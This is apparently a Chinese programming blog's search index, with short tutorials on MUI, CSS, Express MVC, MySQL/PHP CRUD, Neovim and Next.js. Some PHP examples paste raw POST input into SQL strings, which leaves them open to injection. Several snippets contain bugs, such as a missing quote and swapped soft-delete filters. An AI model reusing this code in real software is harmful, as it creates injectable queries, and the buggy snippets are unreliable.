這邊順便介紹一下 MUI 的命名規則是 [hash]-Mui[元件名稱]-[元件中的其他插槽] 你可能會想說有 hash 值的話要怎麼寫？不過不用擔心，透過 sx 你只需要寫成 &amp; .MuiSlider-[插槽名稱] 就可以了，不用擔心 hash 值： 123456789101112131415export default function SxProp() { return ( &lt;Slider defaultValue={30} sx={{ width: 300, color: 'success.main', // 把按鈕的部分改成方形 '&amp; .MuiSlider-thumb': { borderRadius: 1 } }} /&gt; )} 所以當你碰到「要改的部分是元件的插槽」時，就用這種方式來修改就行了。","link":"/2022/07/11/mui-basic/"},{"title":"CSS 多行文字顯示 ... 的效果","text":"原來還有這種盒子。 簡述一般要用 CSS 做出「文字…」的效果只適用於單行文字，作法可以參考我以前寫的 CSS 讓文字有 … 的效果。 今天我發現了一個新的方法，它不需要 JavaScript，只要 CSS 就可以達成。 新的盒子這邊要用一個叫做 -webkit-box 的屬性來達成，這裡先示範怎麼做出「多行文字…」的效果，等等再來說明 -weblit-box 是什麼。 備註：前綴字已經透露這只能用在 webkit 瀏覽器，也就是 Google 或 Safari。 HTML： 123456789101112131415161718&lt;style&gt; div { /* 新的盒子 */ display: -webkit-box; /* 設定盒子內的排列方向 */ -webkit-box-orient: vertical; /* 要顯示幾行文字 */ -webkit-line-clamp: 10; /* 超出的範圍隱藏 */ overflow: hidden; width: 300px; border: 1px solid #000; margin: 20px; }&lt;/style&gt;&lt;div&gt; Lorem ipsum dolor, sit amet consectetur adipisicing elit. Quas in iure ullam quia repellat. Voluptates excepturi debitis ipsam nulla pariatur saepe dolore dolor nesciunt, placeat recusandae blanditiis. Quae commodi eius sint at alias numquam adipisci nisi, consequatur repellat laboriosam dicta et similique nemo excepturi quasi in deleniti fugiat cupiditate aliquam neque iure iusto voluptatem. Ullam unde totam iure deleniti, molestias perspiciatis quis eaque eveniet distinctio! Dolore eligendi laborum, voluptatem eum explicabo culpa, nostrum blanditiis molestiae aliquam fugit veritatis pariatur nam enim? Perspiciatis porro molestias laboriosam sequi eveniet distinctio, reiciendis impedit vel? Harum esse facere ullam expedita quod tenetur, a repellat.&lt;/div&gt; Output： 所以下次懶得寫 JS 的話可以考慮用這個方法來做，會省事很多～ 關於 webkit-box它跟 flex-box 有 87 分像，所以可以想成是另一種 flex 就好了（但還是不一樣哦）。 這邊做一個一個示範你就大概懂了： 1234567891011121314151617181920212223242526&lt;style&gt; section { /* 可以想成是 display: flex */ display: -webkit-box; /* 跟 align-item 一樣 */ -webkit-box-align: start; /* 跟 flex-direction 一樣 值有 horizontal 跟 vertical */ -webkit-box-orient: horizontal; } div { width: 300px; border: 1px solid #000; margin: 20px; } div + div { /* flex: 1 */ -webkit-box-flex: 1; }&lt;/style&gt;&lt;section&gt; &lt;div&gt;Lorem ipsum, dolor sit amet consectetur adipisicing elit. Aut minus molestias adipisci, eos praesentium cum! Necessitatibus, a. Pariatur iusto rem ea natus nobis voluptatum distinctio, sed saepe, ex repudiandae magni?&lt;/div&gt; &lt;div&gt;Lorem ipsum dolor sit amet consectetur adipisicing elit. Et, ex quia, ipsa dolores repudiandae corrupti facere impedit, explicabo nobis optio suscipit temporibus harum ipsum accusamus quas. Illum quam qui debitis, quo fugit nisi eligendi, sit porro suscipit blanditiis praesentium, ducimus totam facilis illo omnis obcaecati quis saepe non adipisci. Alias, odit nulla totam reprehenderit cupiditate modi ab nostrum, dolor, incidunt ex perspiciatis velit illum deleniti eaque aperiam eos dolores laboriosam.&lt;/div&gt;&lt;/section&gt; 大概知道一下就好，你不會想拿這個來排版，主要用途還是上面的多行文字…效果。","link":"/2022/02/13/multiple-line-ellipsis/"},{"title":"MVC 架構與基本範例","text":"好用的架構。 什麼是 MVC？先來看張圖： Model：就是跟資料庫有關的部分，專職處理「資料」相關的操作 View：就是跟畫面有關的部分，根據丟進去的「資料」產生「畫面」 Controller：負責指揮 Model 對資料庫做什麼事，或是給 View 對應的資料來顯示，最後再把 response 回傳 範例拿 Express 來舉例： 12345678910111213141516const express = require('express');const todoController = require('./controllers/todoController');const app = express();const port = 5000;// 設定 view engine 為 EJSapp.set('view engine', 'ejs');// 跟 todo 有關的 request 一律交給 todoController 處理app.get('/todos', todoController.getAll)// : 代表參數app.get('/todos/:id', todoController.get)app.listen(port, () =&gt; { console.log(`Example app listening on port ${port}`);}) Model 只負責提供資料： 123456789101112const todos = ['first todo', 'second todo', 'third todo'];const todoModel = { // 回傳所有 todo getAll: () =&gt; { return todos; }, // 回傳單一 todo get: id =&gt; { return todos[id]; }}module.exports = todoModel Controller 負責協調 Model 和 View： 1234567891011121314151617181920// 把 Model 引進來，才能跟 Model 溝通const todoModel = require('../models/todoModel');const todoController = { // 先跟 Model 拿資料，在丟給 View getAll: (req, res) =&gt; { res.render('todos', { // 要 render 的資料 todos: todoModel.getAll() }) }, // 先跟 Model 拿資料，在丟給 View get: (req, res) =&gt; { const id = req.params.id; res.render('todo', { // 要 render 的資料 todo: todoModel.get(id) }) }}module.exports = todoController View 只負責根據資料顯示畫面： 12345678// todos.ejs&lt;h1&gt;Todos&lt;/h1&gt;&lt;ul&gt; &lt;% for (const todo of todos) { %&gt; &lt;li&gt;&lt;%= todo %&gt;&lt;/li&gt; &lt;% } %&gt; &lt;/ul&gt; 123// todo.ejs&lt;h1&gt;Todos&lt;/h1&gt;&lt;h2&gt;&lt;%= todo %&gt;&lt;/h2&gt;","link":"/2022/03/25/mvc-basic/"},{"title":"MySQL 中的內建函式","text":"把我覺得不錯用的記下來。 取得目前時間1SELECT NOW() AS now; 設定日期格式我最常用 X年X月X日 的格式來輸出，所以這邊拿這個舉例： 1SELECT DATE_FORMAT('2022-02-17 23:29:16', '%Y年%c月%e日') AS formated; 順便附上用 PHP 的寫法： 12345678910$date = '2022-02-17 23:29:16';$format = '%Y年%c月%e日';$sql = \"SELECT DATE_FORMAT(?, ?) AS formated\";$stmt = $conn-&gt;prepare($sql);$stmt-&gt;bind_param('ss', $date, $format);$stmt-&gt;execute();$result = $stmt-&gt;get_result();$row = $result-&gt;fetch_assoc();$created_at = htmlspecialchars($row['formated']); 更多的格式語法可以參考這裡。 計算欄位總數備註：COUNT() 裡面放要計算的 column。 這邊是計算沒被刪除的文章數量： 1SELECT COUNT(posts.id) AS total FROM posts WHERE posts.is_deleted = 0; 找出欄位的最大值備註：MAX() 裡面放要計算的 column。 這邊是找出 id 最大的欄位： 1SELECT MAX(id) AS id FROM todos; 計算總和這邊是把所有 id 加總結果： 附註：12 + 18 + 19 + 20 + 21 1SELECT SUM(categories.id) AS sum FROM `categories`; 計算平均值這邊是把所有 id 加總後的平均值： 附註：90 / 5 1SELECT AVG(categories.id) AS average FROM `categories` 把多欄合併成一欄這邊是把 id 和 name 給合併成一個欄位： 1SELECT CONCAT(categories.id, categories.name) AS id_and_name FROM `categories`;","link":"/2022/02/19/mysql-built-in-function/"},{"title":"MySQL 連線到資料庫","text":"在 CRUD 以前。 簡述1234567891011121314151617181920212223242526272829/* 四個參數： 1. 主機位置 2. 使用者名稱 3. 密碼 4. 資料庫名稱*/$server_name = 'localhost';$username = 'username';$password = '123456';$db_name = 'dbname'; // 回傳值是一個物件$conn = new mysqli($server_name, $username, $password, $db_name);/* 如果 server 沒有打開錯 warning 偵測，最好是自己 check， 這物件下有 connect_errno 可以檢查，有錯誤的話值會是 1，*/if ($conn-&gt;connect_errno) { // 有錯誤就把錯誤訊息印出來 die('資料庫連線錯誤：' . $conn-&gt;connect_error);}// 設定編碼$conn-&gt;query('SET NAMES UTF8');// 設定時區$conn-&gt;query('SET time_zone = \"+8:00\"');?&gt; 通常會另外開一個 conn.php 來儲存連到資料庫的 code，這樣就可以直接在其他檔案中： 1require_once('conn.php') 另外要對資料庫做任何操作都會用到 -&gt;query 這個指令，特別強調一下。","link":"/2022/02/03/mysql-connect-to-data-base/"},{"title":"MySQL 建立新資料到資料庫","text":"新增資料 簡述要看前端是用 POST 還是 GET 來帶資料的： 12345678910111213141516171819&lt;?php// 把前端帶過來的資料存起來$username = $_POST['username'];// 字串拼接寫法$sql = 'INSERT INTO users(username) VALUES(\"' . $username . '\")';// sprintf 寫法$sql2 = sprintf('INSERT INTO users (username) VALUES (\"%s\")', $username);// 下 query 指令$result = $conn-&gt;query($sql2);// 檢查回傳值if (!$result) { die($conn-&gt;error);}// 在 response header 加上這段 = 重新導向header('Location: index.php');?&gt;","link":"/2022/02/03/mysql-create-data/"},{"title":"MySQL JOIN 語法","text":"想在複習一次。 簡述關聯式資料庫最重要的就是「關聯」，當我們要把兩個 table 用某個欄位給關聯起來時就會用到 JOIN 的語法，在那之前先認識一下 JOIN 的種類： （INNER） JOIN 交集 LEFT JOIN 合併到左邊的 table RIGHT JOIN 合併到右邊的 table OUTER JOIN 聯集 參考這張圖會好理解很多： （INNER） JOIN 在 Users 的 ID 有 1 2 3 4 5，Likes 的 User ID 有 3 1 1 6 4。INNER JOIN 就是把兩個 table 有對應到的關聯欄位留下來。 上面的例子是 1 3 4，最後只會把出現 1 3 4 的欄位合在一起。 LEFT JOIN（最常用） 在 Users 的 ID 有 1 2 3 4 5，Likes 的 User ID 有 3 1 1 6 4。LEFT JOIN 就是把左邊的 table 全部留下，右邊只留下有對應的欄位。 所以 Users 會全部留下，而 Likes 只留下 3 1 1 4，沒對應的地方就用 null 來填。 RIGHT JOIN 在 Users 的 ID 有 1 2 3 4 5，Likes 的 User ID 有 3 1 1 6 4。RIGHT JOIN 就是把右邊的 table 全部留下，左邊只留下有對應的欄位。 所以 Likes 會全部留下，而 Users 只留下 1 3 4，沒對應的地方就用 null 來填。 OUTER JOIN 在 Users 的 ID 有 1 2 3 4 5，Likes 的 User ID 有 3 1 1 6 4。OUTER JOIN 就是把不管有沒有關聯都留下。 所以 Users 跟 Likes 會全部留下，沒對應的地方就用 null 來填。","link":"/2022/02/14/mysql-join/"},{"title":"MySQL 讀取資料庫中的資料","text":"讀取資料。 簡述12345678910111213141516171819202122232425262728293031323334&lt;?php // 把連到 DB 的檔案引入 require_once('conn.php'); // 下 sql 指令是透過 $conn 不是 $result $result = $conn-&gt;query('SELECT * FROM users ORDER BY id ASC'); // 檢查結果有沒有值 if (!$result) { // 沒有的話顯示錯誤訊息 die($conn-&gt;error); } $format = ' &lt;div class=\"user\"&gt; &lt;p class=\"user__id\"&gt;id: %d&lt;/p&gt; &lt;p class=\"user__name\"&gt;username: %s&lt;/p&gt; &lt;a class=\"user__button\" href=\"delete.php?id=%d\"&gt;刪除&lt;/a&gt; &lt;/div&gt; '; /* 可想成是 $row = $result-&gt;fetch_assoc() while ($row) {...} $row = $result-&gt;fetch_assoc() while ($row) {...} */ while($row = $result-&gt;fetch_assoc()) { // 把所有的 id 欄位跟 username 印出來 echo sprintf($format, $row['id'], $row['username'], $row['id'] ); }?&gt; 關於 $result-&gt;fetch_assoc() 的部分可以想成是這樣： 12345678910111213&lt;?php // 第一個 row $row = $result-&gt;fetch_assoc(); print_r($row); // 第二個 row $row = $result-&gt;fetch_assoc(); print_r($row); // 第三個 row $row = $result-&gt;fetch_assoc(); print_r($row);?&gt;","link":"/2022/02/03/mysql-read-data/"},{"title":"MySQL 從資料庫中刪除資料","text":"刪除資料。 簡述一般是建議前端用 POST 來帶資料，這邊是偷懶才用 GET： 12345678910111213141516171819202122232425&lt;?phprequire_once('conn.php');// 取得前端送來的資料$id = $_GET['id'];// 檢查是不是空值if (empty($id)) { die('請輸入 id');}// sprintf 寫法$sql2 = sprintf('DELETE FROM users WHERE id=%d', $id);// 下 query 指令$result = $conn-&gt;query($sql2);// 檢查回傳值if (!$result) { die($conn-&gt;error);}// 檢查影響了幾列（看下面補充內容）if ($conn-&gt;affected_rows &gt;= 1) { echo '刪除成功';} else { echo '查無資料';}&gt; 要特別注意的是，對 MySQL 來說只有「對不存在的欄位做操作」才算是錯誤，不然只會被視為是「影響不存在的資料」而已，參考這個例子： 12345&lt;?php require_once('conn.php'); $result = $conn-&gt;query('DELETE FROM users WHERE id=200'); echo $result // 1，代表執行成功?&gt; 這時候如果只檢查 $result 就不太精準，建議加上 $conn-&gt;affected_rows 來查看實際影響了幾列： 123456&lt;?phprequire_once('conn.php');$result = $conn-&gt;query('DELETE FROM users WHERE id=32');echo $result . '&lt;br&gt;'; // 1echo $conn-&gt;affected_rows; // 0?&gt; 大概就是這樣囉。","link":"/2022/02/03/mysql-delete-data/"},{"title":"MySQL 中的 soft delete 與 hard delete","text":"讓我想起 Git 裡的 git reset –soft –hard。 簡述拿這個 table 來舉例： hard delete意思就是真的把資料庫裡的資料直接刪除 1DELETE FROM comments WHERE username='peanu'; 執行完後 peanu 的留言就真的真的消失了，沒辦法復原。 soft delete意思是用狀態來表示，而不是真的把資料刪掉。 通常會新增一個叫做 is_deleted 的欄位，用 0 或 1 來表示這個欄位是不是處於「刪除狀態」。如果真的不小心「誤刪」資料的話還有機會可以救回來。 要刪除欄位的話只要更新欄位狀態就可以了： 1UPDATE comments SET is_deleted=1 WHERE id=160; 現在 id=160 的 is_delete 狀態變成 1，代表刪除。 根據狀態來過濾資料補充一下要怎麼正確的過濾資料。如果不是用 0 1 來表示狀態的話，不能直接用 is_deleted != null 來選，而是要用 IS 或 IS NOT 來過濾。 例如要把被刪除的資料抓出來： 1SELECT * FROM `comments` WHERE is_deleted IS NOT null; 如果想把沒被刪除的資料抓出來： 1SELECT * FROM `comments` WHERE is_deleted IS null; 但如果是用 0 1 的話就可以直接 is_deleted !=0 或 is_deleted = 0 來抓資料。 被刪除的： 1SELECT * FROM `comments` WHERE is_deleted = 0; 沒被刪除的： 1SELECT * FROM `comments` WHERE is_deleted != 0;","link":"/2022/02/14/mysql-soft-and-hard-delete/"},{"title":"MySQL 語法","text":"懶人包。 基礎讀取口訣：從哪個「table」選到哪個「欄位」： 主結構：SELECT … FROM … WHERE … 1SELECT * FROM users; 代表 users 這個 table 中的所有欄位。 12SELECT id FROM users;SELECT users.id FROM users; 代表 users 這個 table 中的 id 欄位。 12SELECT id, content FROM users;SELECT users.id, users.content FROM users; 代表 users 這個 table 中的 id 跟 content 欄位。 1SELECT content as text FROM users; 代表 users 這個 table 中的 content 欄位，但我要把這個欄位名稱改成 text 1SELECT * FROM users WHERE username='PeaNu' 代表 users 這個 table 中 username 是 PeaNu 的所有欄位。 1SELECT * FROM users WHERE username='PeaNu' AND id=1; 代表 users 這個 table 中 username 是 PeaNu 且 id 是 1 的 所有欄位。 1SELECT * FROM users WHERE username='aaa' OR id=1; 代表 users 這個 table 中 username 是 aaa 或 id 是 1 的 所有欄位。 1SELECT * FROM users ORDER BY id ASC 代表從 users 這個 table 拿出所有欄位，並按照「id」來升冪排序。 備註：降冪的話把 ASC 改成 DESC 新增口訣：把 「xxx」 新增到某個 「table」 裡面。 主結構：INSERT INTO … VALUES … 1INSERT INTO users (username, content) VALUES ('PPB', 'Hi'); 把 username='PPB' 和 content='HI' 新增到 users 這個 table。 修改口訣：把 tablue 中的 「xxx」修改成「ooo」。 主結構：UPDATE … SET … WHERE … 1UPDATE users SET username='ABC', content='GOGOGO' WHERE id=3; 記得這邊的 WHERE 很重要，如果沒有指定條件會把所有欄位都改掉。 1UPDATE users SET username='PeaNu' WHERE 1; 這樣所有的 username 欄位都會變成 PeaNu。 刪除從哪個「table」刪除某個「欄位」。 主結構：DELETE FROM … WHERE … 1DELETE FROM users WHERE name='PeaNu'; 一樣要注意 WHERE，如果寫成 WHERE 1 代表把所有欄位刪除。 顯示幾筆資料通常用來做分頁效果： 1SELECT * FROM users LIMIT 5 意思是顯示五筆資料。 跳過幾筆資料通常用來做分頁效果： 1SELECT * FROM users OFFSET 5; 意思是跳過前五筆資料。 設定範圍例如想找出 id 在 15 到 20 之間的欄位，我可以： 1SELECT * FROM `categories` WHERE id BETWEEN 15 AND 20; 這樣就會把 id 是 15 16 17 18 19 20 的欄位撈出來（注意有包含 15 和 20） 指定多個值原本要找 id 為 1 2 3 的資料會這樣寫： 1SELECT * FROM `categories` WHERE id=1 OR id=2 OR id=3; 但其實有更簡潔的寫法： 1SELECT * FROM `categories` WHERE id IN(1, 2, 3); 字串搜尋直接用範例來解釋： 找出有包含 i 這個字的欄位 1SELECT * FROM `categories` WHERE name LIKE '%i%'; 找出以 i 開頭的欄位： 1SELECT * FROM `categories` WHERE name LIKE 'i%'; 找出以 i 結尾的欄位： 1SELECT * FROM `categories` WHERE name LIKE '%i'; 找出三個字，且裡面有包含 i 的欄位： 12SELECT * FROM `categories` WHERE name LIKE '_i%';SELECT * FROM `categories` WHERE name LIKE '%i_'; 寫這麼多範例最主要是要你了解 % 跟 _ 在幹嘛用的。 % 代表任意字元，所以 %i% 代表開頭和結尾可以是任意字元。但 i% 就不一樣了，意思是 i + 任意字元 的組合才正確（有點類似正則表達裡的 pattern），這兩個要分清楚才不會搞錯。 _ 也是代表任意字元，差別是可以「限制總字數」，所以 %i_ 算起來是三個字，就代表欄位值也只能有三個字。 進階指令合併兩個資料表備註：LEFT JOIN 是留下左邊 table 的所有資料，RIGHT JOIN 是反過來。 懶人包：SELECT 要撈出來的欄位 FROM 第一個 table LEFT JOIN 第二個 table ON 兩個 table 關聯的欄位（可以把 ON 想成是 WHERE 在設定條件的感覺）。 1SELECT customers.name, orders.order_number FROM customers LEFT JOIN orders ON customers.client_id = orders.client_id; 備註：如果插入的 table（在這邊是 orders）中沒有資料，就會顯示 null 從 customers 跟 orders 把「顧客名稱」、「訂單編號」撈出來，兩個 table 關聯的欄位是 client_id。（講白話一點就是把兩個 client_id 一樣的資料撈出來） 參考我練習的圖片： customers： orders： 查詢結果：","link":"/2022/01/31/mysql-syntax/"},{"title":"MySQL 修改資料庫中的資料","text":"修改資料。 簡述1234567891011121314151617181920212223242526272829&lt;?phprequire_once('conn.php');// 前端送來的資料$id = $_POST['id'];$username = $_POST['username'];// 檢查空值if (empty($id) || empty($username)) { die('請輸入 id 和 username');}// 記得 username 是字串所以要用引號包起來$sql2 = sprintf('UPDATE users SET username=\"%s\" WHERE id=%d', $username , $id);// 下 query$result = $conn-&gt;query($sql2);// 檢查回傳值if (!$result) { die($conn-&gt;error);}// 檢查影響了幾列if ($conn-&gt;affected_rows &gt;= 1) { echo '修改成功';} else { echo '修改失敗;}?&gt; 這邊補充一下什麼時候會出現「影響了 0 列」： 修改的 username 跟原本的一模一樣 輸入一個不存在的 id（甚至輸入成字串也不會出錯）","link":"/2022/02/03/mysql-update-data/"},{"title":"水仙花數","text":"來自 LIOJ，還蠻值得練習的題目。 解題方向 怎麼知道一個數字有幾位數？ 怎麼取出每個位數的數字？ 求出位數把一個數字一直 /10（記得無條件捨去），直到 0 為止。看總共除幾次，就代表這個數字有幾位數： 1234567891011121314function digitCount(n) { // n=0 時會被當作 0 位數，所以做點處理 if(n === 0) return 1 let result = 0 // 直到 0 為止 while(n !== 0) { n = Math.floor(n/10) result++ } return result}digitCount(0) // 1digitCount(12) // 2digitCount(123) // 3 取出每個位數的數字對一個數字取餘數 %10 可以取到「最後一位數字」，接著搭配迴圈使用 /10 來更新數字（去掉最後一位數），就可以取出每一個位數的數字： 12345678function printSingleDigit(n) { while(n !== 0) { const number = n % 10 console.log(number) n = Math.floor(n/10) }}printSingleDigit(123) 輸出結果： 123321 解法上面問題搞定後，接下來只要依據水仙花數的定義來解題即可： 12345678910111213141516171819function isNarcissistic(n) { // 幾位數 let digit = digitCount(n) // 儲存每一位數的加總 let sum = 0 // 複製一份數字 let m = n // 計算總和 while(m !== 0) { // 每一位數 x 位數 sum += (m%10) ** digit // 去除最後一位數 m = Math.floor(m/10) } console.log(sum === n)}isNarcissistic(5) // trueisNarcissistic(1634) // trueisNarcissistic(1024) // false 這裡做兩個小提醒： n 的值必須拷貝一份，不然最後會變成 0，也就沒辦法做 sum === n 的判斷 m%10 ** digit，其中 m%10 必須括號起來，否則會先計算 10**digit 作弊解法－轉成字串前面是用正統的數學計算來取得每一位數還有總位數，但你仔細想想，如果變成字串的話，要做到那些事就容易很多，例如說 '123'： 取得每一位數 str[0] = 1 str[1] = 2 str[2] = 3 取得總位數 str.length = 3 所以把剛剛的例子改寫一下： 1234567891011121314function isNarcissisticString(n) { // 轉成字串 const str = n + '' // 總位數 const digits = str.length let sum = 0 for(let i=0; i&lt;str.length; i++) { sum += Number(str[i]) ** digits } console.log(sum === n)}isNarcissisticString(5) // trueisNarcissisticString(1634) // trueisNarcissisticString(1024) // false 一樣可以求出正確的結果唷！","link":"/2021/12/26/narcissistic-number/"},{"title":"Neovim－配置筆記","text":"把一些基本的概念記錄下來。 補充知識1. 什麼是 &lt;CR&gt;？ 注意到有些指令後面有 &lt;CR&gt;（carriage return） 這個字，這個背後的含義其實很簡單，就是幫你按下 Enter 來執行這個指令的意思。 2. 什麼是 Buffer？ 簡單來說可以想成是「分頁（Tab）」的意思，不過實際上還是有些差異。 3. 在 lua 中寫 vim 指令 有些時候你可能會在官方文件中看到類似這樣的配置： 12345let g:VM_maps = {}let g:VM_maps['Find Under'] = '&lt;C-d&gt;' \" replace C-nlet g:VM_maps['Find Subword Under'] = '&lt;C-d&gt;' \" replace visual C-nlet g:VM_maps[\"Select Cursor Down\"] = '&lt;M-C-Down&gt;' \" start selecting downlet g:VM_maps[\"Select Cursor Up\"] = '&lt;M-C-Up&gt;' \" start selecting up 但如果你是用 lua 來撰寫的話，可以改寫成這樣子： 1234567vim.cmd([[ let g:VM_maps = {} let g:VM_maps['Find Under'] = '&lt;C-d&gt;' let g:VM_maps['Find Subword Under'] = '&lt;C-d&gt;' let g:VM_maps['Add Cursor Down'] = '&lt;C-n&gt;' let g:VM_maps['Add Cursor Up'] = '&lt;C-p&gt;']]) Packer.vim 的相關指令 PackerInstall 安裝套件 PackerUpdate 更新套件 PcakerSync 更新套件並產生一個 packer_compiled.lua，可以想成是緩存的概念吧，主要是用來提升載入速度而存在的 基本結構1234567├── README.md├── init.lua // nvim 的進入點（基本上就是把所有 lua 的東西引入）├── lua // 放 lua 相關的檔案│&nbsp;&nbsp; └── user│&nbsp;&nbsp; ├── options.lua└── plugin └── packer_compiled.lua 附註：user 資料夾是為了避免 .lua 撞名而開的 打開 .config/nvim/lua/user/options.lua 可以看到一些內容： 1234567vim.opt.backup = false -- creates a backup filevim.opt.clipboard = \"unnamedplus\" -- allows neovim to access the system clipboardvim.opt.cmdheight = 1 -- more space in the neovim command line for displaying messagesvim.opt.completeopt = { \"menuone\", \"noselect\" } -- mostly just for cmpvim.opt.conceallevel = 0 -- so that `` is visible in markdown filesvim.opt.fileencoding = \"utf-8\" -- the encoding written to a filevim.opt.hlsearch = true -- highlight all matches on previous search pattern 主要用來設定 nvim 的基本配置，如果想知道所有能設定的內容與細節的話，可以下 :help options 來搜尋。 接著 init.lua 的內容是這樣： 1require \"user.options\" 注意在引入的時候不需要把完整路徑跟副檔名填入（跟 ES Module 在引入的感覺有點像），像這樣 lua.user.options.lua，只需要 user.options 即可。 Keymaps打開 .config/nvim/lua/user/keymaps.lua 會看到底下內容： 1234567891011121314151617181920212223242526272829303132333435363738-- 用變數儲存 vim.keymap.set 這個函式local keymap = vim.keymap.set-- 共用的 optionslocal opts = { silent = true }--Remap space as leader keykeymap(\"\", \"&lt;Space&gt;\", \"&lt;Nop&gt;\", opts)vim.g.mapleader = \" \"-- Modes-- normal_mode = \"n\",-- insert_mode = \"i\",-- visual_mode = \"v\",-- visual_block_mode = \"x\",-- term_mode = \"t\",-- command_mode = \"c\",-- Normal ---- Better window navigationkeymap(\"n\", \"&lt;C-h&gt;\", \"&lt;C-w&gt;h\", opts)keymap(\"n\", \"&lt;C-j&gt;\", \"&lt;C-w&gt;j\", opts)keymap(\"n\", \"&lt;C-k&gt;\", \"&lt;C-w&gt;k\", opts)keymap(\"n\", \"&lt;C-l&gt;\", \"&lt;C-w&gt;l\", opts)-- Resize with arrowskeymap(\"n\", \"&lt;C-Up&gt;\", \":resize -2&lt;CR&gt;\", opts)keymap(\"n\", \"&lt;C-Down&gt;\", \":resize +2&lt;CR&gt;\", opts)keymap(\"n\", \"&lt;C-Left&gt;\", \":vertical resize -2&lt;CR&gt;\", opts)keymap(\"n\", \"&lt;C-Right&gt;\", \":vertical resize +2&lt;CR&gt;\", opts)-- Navigate bufferskeymap(\"n\", \"&lt;S-l&gt;\", \":bnext&lt;CR&gt;\", opts)keymap(\"n\", \"&lt;S-h&gt;\", \":bprevious&lt;CR&gt;\", opts)-- Clear highlightskeymap(\"n\", \"&lt;leader&gt;h\", \"&lt;cmd&gt;nohlsearch&lt;CR&gt;\", opts)-- .... 這邊只解釋主要的部分： vim.g.mapleader = \" \" 這是用來設定 &lt;leader&gt;（常用快捷鍵），之後就可以用 &lt;leader&gt;h 的方式來表示（「空白鍵 + h） keymap(\"n\", \"&lt;leader&gt;h\", \"&lt;cmd&gt;nohlsearch&lt;CR&gt;\", opts) 他只是一個用來設定快捷鍵函式，需要的參數為： 1map('模式', '按键', '映射为XX', opts) Plugin先來介紹這裡會用到的 Plugin Manager。為了可以用 lua 來撰寫 config，所以這邊會用的是 packer.nvim，基本上就跟 vim-plug 是差不多的東西。唯一的差別在於 vim-plug 只能寫 vim script，但 packer.nvim 可以寫 lua。 接下來看到 .config/nvim/lua/user/plugins.lua，這邊我直接寫中文註解，看完你大概就知道這個檔案在幹嘛了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253local fn = vim.fn-- 自動安裝 Packer（如果目前沒有）local install_path = fn.stdpath \"data\" .. \"/site/pack/packer/start/packer.nvim\"if fn.empty(fn.glob(install_path)) &gt; 0 then PACKER_BOOTSTRAP = fn.system { \"git\", \"clone\", \"--depth\", \"1\", \"https://github.com/wbthomason/packer.nvim\", install_path, } print \"Installing packer close and reopen Neovim...\" vim.cmd [[packadd packer.nvim]]end-- 只要儲存這個檔案就自動執行 PackerSync（Packer 的指令）vim.cmd [[ augroup packer_user_config autocmd! autocmd BufWritePost plugins.lua source &lt;afile&gt; | PackerSync augroup end]]-- 如果找不到 packer 就直接跳掉（不往下執行）local status_ok, packer = pcall(require, \"packer\")if not status_ok then returnend-- 用 popup 來顯示目前的安裝進度（預設是分割一個新視窗）packer.init { display = { open_fn = function() return require(\"packer.util\").float { border = \"rounded\" } end, },}-- 到這邊才是真正跟安裝套件有關的 codereturn packer.startup(function(use) use \"wbthomason/packer.nvim\" -- 套件二 use \"nvim-lua/popup.nvim\" -- 套件二 use \"nvim-lua/plenary.nvim\" -- 套件三 -- Automatically set up your configuration after cloning packer.nvim -- Put this at the end after all plugins if PACKER_BOOTSTRAP then require(\"packer\").sync() endend) 安裝好的套件可以從 /Users/peanu/.local/share/nvim/site/pack/packer/start 找到。（簡單來說就是 nvim/site 裡面） 至於 nvim 裡面的其他檔案或資料夾是用來給套件存放一些資料用的，不用太在意。 Lazy Loading簡單來說你可以設定某些套件不要在一開始打開 nvim 的時候直接載入，例如這個官方範例： 1234567return require('packer').startup(function(use) use 'wbthomason/packer.nvim' use '9mm/vim-closer' -- Lazy loading: -- Load on specific commands use {'tpope/vim-dispatch', opt = true, cmd = {'Dispatch', 'Make', 'Focus', 'Start'}} 附註：use 後面可以接一個 lua 的 Table（一種資料型態） 當我這樣子設定後 tpope/vim-dispatch 就只會在我輸入 :Dispatch 或 :Make 等等的指令後才會被載入。 順道一提，只要是設定 Lazy Loading 的套件都會出現在 /Users/peanu/.local/share/nvim/site/pack/packer/opt 裡。 Error handling一般來說當 nvim 打開時若找不到套件的話，就會直接噴一個全屏的 Error 給你看，像這樣： 如果是用 vim script 的話是沒辦法做錯誤處理的，這邊目前的寫法是這樣子： 12345require \"user.options\"require \"user.keymaps\"require \"user.plugins\"-- vim scriptvim.cmd \"colorscheme tokyonight-moon\" 但如果是用 lua 的話就不一樣了，我們可以改成這樣子： 1234require \"user.options\"require \"user.keymaps\"require \"user.plugins\"require \"user.colorscheme\" 並填入這樣的內容： 1234567891011-- 想引入的主題local colorscheme = \"tokyonight-moon\"-- pcall 回傳第一個值是狀態，第二個是 module 的回傳值（以這例子來說沒有所以就用 _ 表示）-- \"..\" 是字串連結的意思local status_ok, _ = pcall(vim.cmd, \"colorscheme \" .. colorscheme)-- 如果不 ok 的話就在狀態列顯示錯誤訊息if not status_ok then vim.notify(\"colorscheme \" .. colorscheme .. \" not found!\") returnend 這樣子當套件載入失敗時就只會顯示訊息，不會好像整個程式都壞掉了一樣： 設定套件的 mapping基本上設定快捷鍵的方式就是先知道你想要的指令是什麼？，並且在設定對應的按鍵。 以 來說，你可以在 config 中這樣子寫： 1234567891011mapping = { -- &lt;C-k&gt; 對應到往前一個選項選 [\"&lt;C-k&gt;\"] = cmp.mapping.select_prev_item(), -- &lt;C-k&gt; 對應到往下一個選項選 [\"&lt;C-j&gt;\"] = cmp.mapping.select_next_item(), -- &lt;C-k&gt; 移動 doc 中的滾軸 [\"&lt;C-b&gt;\"] = cmp.mapping(cmp.mapping.scroll_docs(-1), { \"i\", \"c\" }), -- &lt;C-k&gt; 移動 doc 中的滾軸 [\"&lt;C-f&gt;\"] = cmp.mapping(cmp.mapping.scroll_docs(1), { \"i\", \"c\" }), -- 略.... } Telescope功能 :Telescope find_files 找檔案 :Telescope git_branches 找分支（目前 pwd 位置） :Telescope live_grep 全域搜尋關鍵字（需安裝 ripgrep） 視窗開啟後的快捷鍵可參考 telescope.lua 檔案的內容。","link":"/2022/10/22/neovim-config-note/"},{"title":"Next.js－404 頁面","text":"每個網站都有的 404 頁面。 簡述如果想定義自己的 404 頁面的話，可以在 /pages 底下建立 404.js，裡面就可以填入自定義的內容了： 1234567891011121314151617import Link from 'next/link'import React from 'react'export default function NotFound() { return ( &lt;div className='not-found'&gt; &lt;h1&gt;Ooops...&lt;/h1&gt; &lt;h2&gt;That page cannot be found :&lt;&lt;/h2&gt; &lt;p&gt; Go back to the 